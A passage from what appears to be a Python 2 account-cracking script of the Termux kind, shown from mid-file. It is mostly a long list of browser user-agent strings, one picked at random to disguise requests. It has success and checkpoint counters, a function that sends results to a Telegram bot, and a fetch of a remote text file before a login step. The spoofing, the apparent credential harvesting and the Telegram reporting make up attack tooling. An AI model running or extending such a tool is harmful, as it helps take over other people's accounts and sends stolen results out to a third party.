    server.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
    server.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
    server.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
    server.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
    server.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
    server.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
    server.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
    server.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
    server.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
    server.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
    server.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
    server.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
    server.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
    server.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
    server.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
    server.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
    server.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
    server.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
    server.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
    server.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
    server.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
    server.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
    server.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
    server.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
    server.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
    server.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
    server.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
    server.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
    server.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
    server.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
    server.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
    server.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
    server.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
    server.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
    server.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
    server.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
    server.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
    server.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
    server.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
    server.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
    server.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
    server.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
    server.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
    server.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
    server.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
    server.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
    server.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
    server.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
    server.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
    server.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
    server.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
    server.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
    server.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
    server.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
    server.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
    server.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
    server.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
    server.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
    server.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)')
    server.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)')
    server.append('Googlebot/2.1 (http://www.googlebot.com/bot.html)')
    server.append('Opera/9.20 (Windows NT 6.0; U; en)')
    server.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)')
    server.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)')
    server.append('Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0')
    server.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16')
    server.append('Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)')
    server.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13')
    server.append('Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)')
    server.append('Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)')
    server.append('Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)')
    server.append('Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)')
    server.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)')
    server.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8')
    server.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7')
    server.append('Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)')
    server.append('Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)')
    server.append('YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)')
    server.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
    server.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
    server.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
    server.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
    server.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
    server.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
    server.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
    server.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
    server.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
    server.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
    server.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
    server.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
    server.append('AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)')
    server.append('Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)')
    server.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)')
    server.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
    server.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)')
    server.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
    server.append('Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
    server.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
    server.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
    server.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
    server.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
    server.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
    server.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
    server.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
    server.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
    server.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
    server.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
    server.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
    server.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
    server.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
    server.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
    server.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
    server.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
    server.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
    server.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
    server.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
    server.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
    server.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
    server.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
    server.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
    server.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
    server.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
    server.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
    server.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
    server.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
    server.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
    server.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
    server.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
    server.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
    server.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
    server.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
    server.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
    server.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
    server.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
    server.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
    server.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
    server.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
    server.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
    server.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
    server.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
    server.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
    server.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
    server.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
    server.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
    server.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
    server.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
    server.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
    server.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
    server.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
    server.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
    server.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
    server.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
    server.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
    server.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
    server.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
    server.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
    server.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
    server.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
    server.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
    server.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
    server.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
    server.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
    server.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
    server.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
    server.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
    server.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
    server.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
    server.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
    server.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
    server.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
    server.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
    server.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
    server.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
    server.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
    server.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
    server.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
    server.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
    server.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
    server.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
    server.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
    server.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
    server.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
    server.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
    server.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
    server.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
    server.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
    server.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
    server.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
    server.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
    server.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
    server.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
    server.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
    server.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
    server.append('Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620')
    server.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0) AddSugarSpiderBot www.idealobserver.com')
    server.append('Mozilla/5.0 (compatible; AnyApexBot/1.0; +http://www.anyapex.com/bot.html)')
    server.append('Mozilla/4.0 (compatible; Arachmo)')
    server.append('Mozilla/4.0 (compatible; B-l-i-t-z-B-O-T)')
    server.append('Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)')
    server.append('Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)')
    server.append('Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)')
    server.append('BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)')
    server.append('Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)')
    server.append('Sqworm/2.9.85-BETA (beta_release; 20011115-775; i686-pc-linux-gnu)')
    server.append('Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)')
    server.append('Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)')
    server.append('Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )')
    server.append('Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )')
    server.append('Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)')
    server.append('Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)')
    server.append('Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)')
    server.append('Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)')
    server.append('Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729)')
    server.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; Acoo Browser; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; Avant Browser)')

    vpn = random.choice(server)
    API["Headers"]["User-agent"] = vpn

vpn()
#########(5)#########

ok=0
cp=0
sk=0
back = 0
successful = []
cpb = []
oks = []
id = []

    
    
def Cod_Sidra_telegram(bot_message):
    
    global k , c , user , pass1 , pass2 , token , ID 
    bot_token = token
    bot_chatID = ID
    send_text = 'https://api.telegram.org/bot' + bot_token + '/sendMessage?chat_id=' + bot_chatID + '&parse_mode=Markdown&text=' + bot_message

    response = requests.get(send_text)

    return response.json()
    
    
os.system("clear")
re = requests.get("https://raw.githubusercontent.com/termux-fil/pastebin/main/Iran.txt")
print TB
print "\033[1;97mFIRST STEP OF LOGIN"
print "\033[1;97m--------------------"
print "\033[1;97m " 
